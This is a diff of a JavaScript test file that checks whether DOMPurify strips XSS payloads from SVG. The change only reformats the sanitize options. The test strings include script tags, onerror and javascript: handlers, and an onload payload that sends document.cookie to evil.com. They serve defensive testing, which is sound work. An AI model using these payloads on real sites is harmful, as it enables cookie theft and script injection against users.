@@ -23,21 +23,27 @@ describe('SVG Sanitization Security (SI-XSS)', () => {
       <script>alert("XSS")</script>
       <rect width="100" height="100"/>
     </svg>`;
-    const sanitized = purify.sanitize(maliciousSvg, { USE_PROFILES: { svg: true } });
+    const sanitized = purify.sanitize(maliciousSvg, {
+      USE_PROFILES: { svg: true },
+    });
     expect(sanitized).not.toContain('<script');
     expect(sanitized).not.toContain('alert(');
   });
 
   it('strips onerror event handlers', () => {
     const maliciousSvg = `<svg><image onerror="alert('xss')" href="x"/></svg>`;
-    const sanitized = purify.sanitize(maliciousSvg, { USE_PROFILES: { svg: true } });
+    const sanitized = purify.sanitize(maliciousSvg, {
+      USE_PROFILES: { svg: true },
+    });
     // Verify onerror is NOT in the sanitized output
     expect(sanitized).not.toContain('onerror');
   });
 
   it('strips javascript: href attributes', () => {
     const maliciousSvg = `<svg><a href="javascript:alert(1)"><text>click</text></a></svg>`;
-    const sanitized = purify.sanitize(maliciousSvg, { USE_PROFILES: { svg: true } });
+    const sanitized = purify.sanitize(maliciousSvg, {
+      USE_PROFILES: { svg: true },
+    });
     expect(sanitized).not.toContain('javascript:');
   });
 
@@ -45,7 +51,9 @@ describe('SVG Sanitization Security (SI-XSS)', () => {
     const maliciousSvg = `<svg onload="fetch('https://evil.com/'+document.cookie)">
       <circle r="50"/>
     </svg>`;
-    const sanitized = purify.sanitize(maliciousSvg, { USE_PROFILES: { svg: true } });
+    const sanitized = purify.sanitize(maliciousSvg, {
+      USE_PROFILES: { svg: true },
+    });
     expect(sanitized).not.toContain('onload');
     expect(sanitized).not.toContain('evil.com');
   });
@@ -55,7 +63,9 @@ describe('SVG Sanitization Security (SI-XSS)', () => {
       <rect width="100" height="100" fill="blue"/>
       <text x="50" y="50">Hello</text>
     </svg>`;
-    const sanitized = purify.sanitize(cleanSvg, { USE_PROFILES: { svg: true } });
+    const sanitized = purify.sanitize(cleanSvg, {
+      USE_PROFILES: { svg: true },
+    });
     expect(sanitized).toContain('rect');
     expect(sanitized).toContain('Hello');
   });
